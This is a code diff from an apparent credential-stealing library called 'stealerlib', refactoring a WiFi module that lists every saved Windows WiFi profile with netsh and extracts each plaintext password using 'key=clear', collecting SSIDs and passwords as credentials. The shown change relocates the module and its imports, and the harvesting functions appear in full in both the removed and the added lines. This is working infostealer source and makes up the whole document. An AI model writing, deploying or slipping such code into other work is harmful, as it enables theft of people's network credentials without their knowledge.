@@ -2,17 +2,11 @@
 # -*- coding: utf-8 -*-
 """
     @author:  codeuk
-    @package: stealerlib/wifi/__init__.py
+    @package: stealerlib/system/network/wifi.py
 """
 
-import subprocess
-
-from dataclasses import dataclass
-from typing import Union, Optional
-
-from stealerlib.exceptions import catch
-
-from stealerlib.wifi.types import WiFiTypes
+from stealerlib.system import *
+from stealerlib.system.types import SystemTypes
 
 
 class WiFi:
@@ -25,54 +19,17 @@ class WiFi:
     """
 
     def __init__(self):
+        super(WiFi, self).__init__()
+
         self.ssids = []
         self.passwords = []
         self.credentials = []
-
-    @staticmethod
-    def get_wifi_profiles() -> list:
-        """Retrieves all wifi profiles from the system
-
-        Returns:
-            list: A list of all available WiFi profile names
-        """
-
-        args = ['netsh', 'wlan', 'show', 'profiles']
-        data = subprocess.check_output(args)
-        data = data.decode('utf-8', errors="backslashreplace").split('\n')
-
-        profiles = [
-            row.split(":")[1][1:-1] for row in data if "All User Profile" in row
-        ]
-
-        return profiles
-
-    @staticmethod
-    def get_profile_info(profile: str) -> list:
-        """Retrieves wifi profile information for a given profile name
-
-        Parameters:
-            profile (str): The name of the WiFi profile to look up
-
-        Returns:
-            list: A list of the profile information
-        """
-
-        args = ['netsh', 'wlan', 'show', 'profile', profile, 'key=clear']
-        data = subprocess.check_output(args)
-        data = data.decode('utf-8', errors="backslashreplace").split('\n')
-
-        content = [
-            row.split(":")[1][1:-1] for row in data if "Key Content" in row
-        ]
-
-        return content
 
     @catch
     def get_wifi_passwords(
         self,
         conv: Optional[bool]=True
-    ) -> list[Union[list, WiFiTypes.SSID]]:
+    ) -> list[Union[list, SystemTypes.SSID]]:
         """Gets all wifi profiles and their passwords from the system
 
         Parameters:
@@ -100,7 +57,7 @@ class WiFi:
             except subprocess.CalledProcessError:
                 password = "Encoding Error"
 
-            obj_ssid = WiFiTypes.SSID(profile, password)
+            obj_ssid = SystemTypes.SSID(profile, password)
 
             self.ssids.append(obj_ssid.profile)
             self.passwords.append(obj_ssid.password)
@@ -110,3 +67,42 @@ class WiFi:
             )
 
         return self.credentials
+
+    @staticmethod
+    def get_wifi_profiles() -> list:
+        """Retrieves all wifi profiles from the system
+
+        Returns:
+            list: A list of all available WiFi profile names
+        """
+
+        args = ['netsh', 'wlan', 'show', 'profiles']
+        data = subprocess.check_output(args)
+        data = data.decode('utf-8', errors="backslashreplace").split('\n')
+
+        profiles = [
+            row.split(":")[1][1:-1] for row in data if "All User Profile" in row
+        ]
+
+        return profiles
+
+    @staticmethod
+    def get_profile_info(profile: str) -> list:
+        """Retrieves wifi profile information for a given profile name
+
+        Parameters:
+            profile (str): The name of the WiFi profile to look up
+
+        Returns:
+            list: A list of the gathered profiles information
+        """
+
+        args = ['netsh', 'wlan', 'show', 'profile', profile, 'key=clear']
+        data = subprocess.check_output(args)
+        data = data.decode('utf-8', errors="backslashreplace").split('\n')
+
+        content = [
+            row.split(":")[1][1:-1] for row in data if "Key Content" in row
+        ]
+
+        return content
